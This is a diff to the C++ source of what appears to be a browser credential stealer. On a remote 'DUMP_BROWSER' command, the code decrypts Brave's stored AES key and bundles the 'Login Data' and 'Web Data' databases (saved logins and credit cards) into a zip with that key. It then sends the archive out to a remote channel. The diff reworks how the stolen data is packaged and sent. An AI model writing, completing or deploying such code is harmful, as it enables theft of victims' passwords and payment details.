@@ -1,15 +1,13 @@
 #include "CredentialsExtractor.h"
 
-CredentialsExtractor::CredentialsExtractor(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap)
-        : Sender(stream, actionMap) {
+CredentialsExtractor::CredentialsExtractor(ClientSocket &clientSocket, Download &download)
+        : Handler(clientSocket), download(download) {
+    ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["DUMP_BROWSER"] = [&](nlohmann::json& json) {
-        threadGen.runInNewThread(this, &CredentialsExtractor::sendKeyAndDatabase);
+        threadGen.runInNewThread(this, &CredentialsExtractor::sendKeyAndDatabase, json);
     };
 }
 
-void CredentialsExtractor::send() {
-
-}
 
 std::vector<BYTE> CredentialsExtractor::decryptAESKey(const std::string& encryptedDataStr) {
     std::vector<BYTE> encryptedData(encryptedDataStr.begin(), encryptedDataStr.end());
@@ -34,7 +32,7 @@ std::vector<BYTE> CredentialsExtractor::decryptAESKey(const std::string& encrypt
 
 
 std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
-    std::ifstream ifs("C:\\Users\\Nitropc\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
+    std::ifstream ifs("C:\\Users\\javier\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State");
     std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
     std::string key = "encrypted_key";
     std::size_t pos = content.find(key);
@@ -56,19 +54,22 @@ std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
     std::string encryptedStringDecoded;
     macaron::Base64::Decode(encryptedString64,encryptedStringDecoded);
     std::vector<BYTE> decryptedKey = decryptAESKey(encryptedStringDecoded.substr(5));
+
     return decryptedKey;
 }
 
-void CredentialsExtractor::sendKeyAndDatabase() {
+void CredentialsExtractor::sendKeyAndDatabase(nlohmann::json json) {
     std::vector<BYTE> decryptedKey = getDecryptedKey();
     std::cout << decryptedKey.size() << std::endl;
-    std::string pathOfAccountsDatabase = R"(C:\Users\Nitropc\Desktop\Login Data)";
-    std::string pathOfCreditCardsDatabase = R"(C:\Users\Nitropc\Desktop\Web Data)";
-
-    RESULT result;
-    stream.sendBytes(decryptedKey);
-    stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
-    stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
+    std::string pathOfAccountsDatabase = R"(C:\Users\javier\Desktop\Login Data)";
+    std::string pathOfCreditCardsDatabase = R"(C:\Users\javier\Desktop\Web Data)";
+    std::vector<std::filesystem::path> pathsToZip = {pathOfAccountsDatabase, pathOfCreditCardsDatabase};
+    std::vector<uint8_t> data = ZipCompressor::createZipInMemory(pathsToZip, decryptedKey, "encrypted key");
+    download.downloadContentFromVector(data,json["channel_id"]);
+    //RESULT result;
+    //stream.sendBytes(decryptedKey);
+    //stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
+    //stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
 }
 
 
